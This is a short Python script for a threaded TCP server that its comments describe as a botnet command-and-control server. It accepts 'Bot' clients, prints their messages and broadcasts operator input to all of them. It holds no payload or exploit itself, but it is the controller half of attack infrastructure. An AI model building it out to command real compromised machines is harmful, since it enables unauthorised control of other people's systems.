from socket import AF_INET, socket, SOCK_STREAM
import sys
from threading import Thread
import netifaces as ni

# Listens for clients that are trying to connect to the server and creates a new thread to handle each client that connects
def accept_incoming_connections():
    while True:
        client, client_address = SERVER.accept() 
        addresses[client] = client_address
        Thread(target=handle_client, args=(client,)).start()

# Called in a new thread for each client that connects 
# It receives and sends messages to/from the client and updates
def handle_client(client):
    name = f"Bot {len(addresses)}@{addresses[client]}"
    msg = f"{name} has connected"
    print(msg)
    clients[client] = name

    while True:
        msg = client.recv(BUFSIZ)
        if msg != bytes("{quit}", "utf8"):
            msg = msg.decode("utf8")
            print(msg)
        else:
            client.close()
            del clients[client]
            print(f"{addresses[client]} has quit.")
            break

# Sends a message to all connected clients
def broadcast(msg): 
    for sock in clients:
        sock.send(msg)

# Receives input from the server user and broadcasrs it to all connected clients
# If the user sends the "{quit}" message, it stops broadcasting and exits
def send():
    while True:
        msg = input()
        broadcast(bytes(msg, "utf8"))
        if msg == "{quit}":
            break
        
# clients: a dictionary is used to store the clients that are connected to the server
# addresses: a dictionary is used to store the IP addresses and ports of the clients
clients = {}
addresses = {}

# Initializes a server that listens for incoming TCP connections on a specified port
if __name__ == "__main__":
    # C&C's IP address
    HOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    PORT = int(sys.argv[1])
    BUFSIZ = 1024
    ADDR = (HOST, PORT)

    # Create a TCP socket for IPv4 connections and bind the socket to the specified address and port
    SERVER = socket(AF_INET, SOCK_STREAM)
    SERVER.bind(ADDR)

    # Set the server to listen for incoming TCP connections and set max num oif queued connections to 5
    SERVER.listen(5)
    print("Waiting for connection...")

    # Create threads for accepting incoming connections and sending messages to clients and starts them
    # 
    ACCEPT_THREAD = Thread(target=accept_incoming_connections)
    SEND_THREAD = Thread(target=send)
    ACCEPT_THREAD.start()
    SEND_THREAD.start()
    ACCEPT_THREAD.join()
    SEND_THREAD.join()
    SERVER.close()